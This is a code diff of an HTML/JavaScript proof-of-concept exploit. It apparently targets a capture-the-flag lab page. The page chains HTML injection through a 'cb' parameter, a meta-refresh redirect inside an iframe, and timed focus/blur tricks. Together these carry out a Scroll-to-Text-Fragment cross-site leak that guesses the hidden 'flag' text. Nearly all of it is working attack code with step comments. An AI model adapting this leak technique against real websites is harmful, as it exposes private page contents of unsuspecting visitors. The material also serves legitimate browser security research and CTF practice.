@@ -1,13 +1,64 @@
-<html>
-    <body>
-        <iframe src='http://localhost:3000/#oracle:~:text=fla' height=150px width=290px></iframe>
-    </body>
-    <script>
-        var url = 'http://localhost:3000/dev?cb='
-        setTimeout( ()=> {
-            frames[0].location=url+ encodeURIComponent(`<html><meta http-equiv="refresh" content="0;http://localhost:3000/#oracle:~:text=flag">`);
-            console.log('changing focus');
-        },2000);
 
-    </script>
+<!DOCTYPE HTML>
+<body>
+    <div id=inpp ></div>
+<iframe id=asdf src="https://ctf.s1r1us.ninja/lab/ctf/bsides.html#img0:~:text=flag"  height=150px width=290px></iframe>
+<ol>
+<li>
+frame 1:  html injection in same origin (works)
+
+</li></ol>
+
+<script>
+
+var  inp = document.createElement('input')
+inp.value='asd';
+inp.onblur = () =>{
+    console.log('blurred')
+}
+inp.focus()
+inp.id="inp"
+document.getElementById('inpp').append(inp);
+var url ='https://ctf.s1r1us.ninja/lab/ctf/dev.php?cb=';
+    var char = 't'
+setTimeout(function(){
+    location='https://msrkp.github.io/chrome/sttf_2.html#inp'
+    document.getElementById('inp').focus();
+},1000);
+window.onload = ()=>{inp.focus();}
+
+/* using redirect to go to victim site  */
+
+setTimeout( ()=> {
+    frames[0].location=url+ encodeURIComponent(`<html><meta http-equiv="refresh" content="0;https://ctf.s1r1us.ninja/lab/ctf/bsides.html">`);
+},2000);
+
+
+
+/*  focus to top input */
+
+setTimeout( () => {
+	       console.log('changing focus');
+        var  inps = document.createElement('input')
+	inps.value='asdi 2';
+	inps.onblur = () =>{
+   	 console.log('blurred 2')
+	}
+	inps.focus()
+	inps.id="inps"
+	document.getElementById('inpp').append(inps);
+        location = 'https://msrkp.github.io/chrome/sttf_2#inps'
+},4000);
+
+
+
+/*  DO STTF */
+setTimeout(function(){
+    frames[0].location = 'https://ctf.s1r1us.ninja/lab/ctf/bsides.html#img0:~:text=flag';
+},5000)
+
+
+</script>
+</body>
 </html>
+
